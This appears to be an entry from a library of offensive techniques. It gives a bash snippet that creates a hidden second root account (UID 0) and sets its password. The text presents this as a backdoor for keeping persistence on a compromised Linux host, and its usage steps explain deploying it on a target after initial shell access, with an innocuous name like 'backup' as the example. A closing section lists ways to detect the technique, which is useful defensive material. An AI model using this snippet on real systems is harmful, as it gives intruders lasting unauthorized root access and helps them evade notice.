---
id: 3dd17c30-604b-4860-b248-c863496d5293
name: Bash-Create-Root-User-and-Set-Password
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:17.905700+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - persistence
  - script
  - account-creation
validated: true
---

# Bash-Create-Root-User-and-Set-Password

## Code

```bash
sudo useradd -ou 0 -g 0 $_USERNAME
sudo passwd $_USERNAME
echo "$_PASSWORD" | sudo passwd --stdin $_USERNAME
```

## Description

This bash script snippet creates a new user with root privileges and sets its password, either interactively or via stdin, to establish persistence on a compromised Linux system. It combines user creation with password assignment for quick backdoor setup.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_USERNAME | Username for the new root-equivalent account | backup |
| $_PASSWORD | Password to assign to the account | StrongPass123! |

## Usage

Save as a script (e.g., persistence.sh), make executable (`chmod +x persistence.sh`), and run with sudo on the target: `./persistence.sh`. Customize variables before execution. Used in post-exploitation phases after gaining initial shell access, often delivered via reverse shell or file upload.

## Detection

- Monitor sudo logs for useradd and passwd executions (e.g., /var/log/auth.log entries like "useradd -ou 0").
- Audit /etc/passwd for multiple UID 0 entries using `awk -F: '$3 == 0 {print}' /etc/passwd`.
- Process monitoring for echo | passwd patterns in command history or PS output.
- Alert on new root-group users via tools like OSSEC or Splunk.

## Related

- [[procedures/Linux-Add-Root-User-Persistence]]
